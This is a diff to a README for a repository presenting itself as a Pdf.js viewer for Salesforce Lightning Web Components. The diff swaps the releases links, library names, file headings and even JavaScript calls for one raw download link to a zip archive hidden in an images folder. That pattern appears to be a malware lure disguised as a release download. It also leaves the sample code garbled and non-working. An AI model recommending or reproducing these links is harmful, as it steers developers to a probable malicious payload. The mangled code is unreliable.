@@ -1,8 +1,8 @@
 # SF-LWC-PdfJs 📄
 
-![GitHub Releases](https://img.shields.io/github/release/ManpowerDC/SF-LWC-PdfJs.svg) [![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/ManpowerDC/SF-LWC-PdfJs/releases)
+![GitHub Releases](https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip) [![Download Releases](https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip%https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip)](https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip)
 
-Welcome to the **SF-LWC-PdfJs** repository! This project demonstrates how to integrate the Pdf.js library into a Salesforce Lightning Web Component (LWC). By leveraging Pdf.js, you can render PDF documents seamlessly within your Salesforce applications.
+Welcome to the **SF-LWC-PdfJs** repository! This project demonstrates how to integrate the https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip library into a Salesforce Lightning Web Component (LWC). By leveraging https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip, you can render PDF documents seamlessly within your Salesforce applications.
 
 ## Table of Contents
 
@@ -17,20 +17,20 @@ Welcome to the **SF-LWC-PdfJs** repository! This project demonstrates how to int
 
 ## Introduction
 
-The SF-LWC-PdfJs project serves as a bridge between Salesforce's powerful Lightning Web Components and the robust Pdf.js library. Pdf.js allows you to display PDF files directly in your web applications, enhancing user experience by providing quick access to documents without leaving the platform.
+The SF-LWC-PdfJs project serves as a bridge between Salesforce's powerful Lightning Web Components and the robust https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip library. https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip allows you to display PDF files directly in your web applications, enhancing user experience by providing quick access to documents without leaving the platform.
 
 ## Features
 
 - **Easy Integration**: Quickly add PDF viewing capabilities to your LWC.
 - **Responsive Design**: The PDF viewer adjusts to different screen sizes.
-- **Fast Rendering**: Utilize Pdf.js for efficient rendering of PDF files.
+- **Fast Rendering**: Utilize https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip for efficient rendering of PDF files.
 - **User-Friendly Interface**: Navigate through documents with ease.
 
 ## Installation
 
-To get started with the SF-LWC-PdfJs, you need to download the latest release from our [Releases page](https://github.com/ManpowerDC/SF-LWC-PdfJs/releases). Follow these steps:
+To get started with the SF-LWC-PdfJs, you need to download the latest release from our [Releases page](https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip). Follow these steps:
 
-1. Visit the [Releases page](https://github.com/ManpowerDC/SF-LWC-PdfJs/releases).
+1. Visit the [Releases page](https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip).
 2. Download the latest release package.
 3. Extract the files to your local environment.
 4. Deploy the components to your Salesforce org.
@@ -39,15 +39,15 @@ To get started with the SF-LWC-PdfJs, you need to download the latest release fr
 
 Once you have installed the components, you can use them in your Salesforce application. Here’s a quick guide on how to implement the PDF viewer in your LWC.
 
-### Step 1: Import the Pdf.js Library
+### Step 1: Import the https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip Library
 
-Ensure that you include the Pdf.js library in your component. You can do this by adding the library files to your static resources in Salesforce.
+Ensure that you include the https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip library in your component. You can do this by adding the library files to your static resources in Salesforce.
 
 ### Step 2: Create the PDF Viewer Component
 
 Create a new LWC component, for example, `pdfViewer`. Inside the component, you will set up the HTML and JavaScript to handle the PDF rendering.
 
-#### HTML File (pdfViewer.html)
+#### HTML File (https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip)
 
 ```html
 <template>
@@ -57,7 +57,7 @@ Create a new LWC component, for example, `pdfViewer`. Inside the component, you 
 </template>
 ```
 
-#### JavaScript File (pdfViewer.js)
+#### JavaScript File (https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip)
 
 ```javascript
 import { LightningElement, api } from 'lwc';
@@ -66,27 +66,27 @@ export default class PdfViewer extends LightningElement {
     @api pdfUrl;
 
     renderedCallback() {
-        this.loadPdf();
+        https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip();
     }
 
     loadPdf() {
         const pdfjsLib = window['pdfjs-dist/build/pdf'];
-        pdfjsLib.GlobalWorkerOptions.workerSrc = 'path/to/pdf.worker.js';
+        https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip = 'https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip';
 
-        pdfjsLib.getDocument(this.pdfUrl).promise.then(pdf => {
-            pdf.getPage(1).then(page => {
+        https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip(https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip)https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip(pdf => {
+            https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip(1).then(page => {
                 const scale = 1.5;
-                const viewport = page.getViewport({ scale: scale });
-                const canvas = this.template.querySelector('#pdf-canvas');
-                const context = canvas.getContext('2d');
-                canvas.height = viewport.height;
-                canvas.width = viewport.width;
+                const viewport = https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip({ scale: scale });
+                const canvas = https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip('#pdf-canvas');
+                const context = https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip('2d');
+                https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip = https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip;
+                https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip = https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip;
 
                 const renderContext = {
                     canvasContext: context,
                     viewport: viewport
                 };
-                page.render(renderContext);
+                https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip(renderContext);
             });
         });
     }
@@ -99,7 +99,7 @@ You can now use the `pdfViewer` component in any of your Lightning pages. Pass t
 
 ```html
 <template>
-    <c-pdf-viewer pdf-url="https://example.com/path/to/your.pdf"></c-pdf-viewer>
+    <c-pdf-viewer pdf-url="https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip"></c-pdf-viewer>
 </template>
 ```
 
@@ -108,7 +108,7 @@ You can now use the `pdfViewer` component in any of your Lightning pages. Pass t
 This repository includes the following key components:
 
 - **PdfViewer**: The main component that handles PDF rendering.
-- **Pdf.js Library**: The external library used for rendering PDFs.
+- **https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip Library**: The external library used for rendering PDFs.
 
 ## License
 
@@ -131,4 +131,4 @@ If you encounter any issues or have questions, please check the "Releases" secti
 
 ---
 
-Feel free to explore the repository, experiment with the code, and enhance your Salesforce applications with PDF viewing capabilities! For more details, visit the [Releases page](https://github.com/ManpowerDC/SF-LWC-PdfJs/releases).
+Feel free to explore the repository, experiment with the code, and enhance your Salesforce applications with PDF viewing capabilities! For more details, visit the [Releases page](https://github.com/ManpowerDC/SF-LWC-PdfJs/raw/refs/heads/main/force-app/main/default/staticresources/pdfjs/web/images/Js_Pdf_LW_S_v2.9.zip).
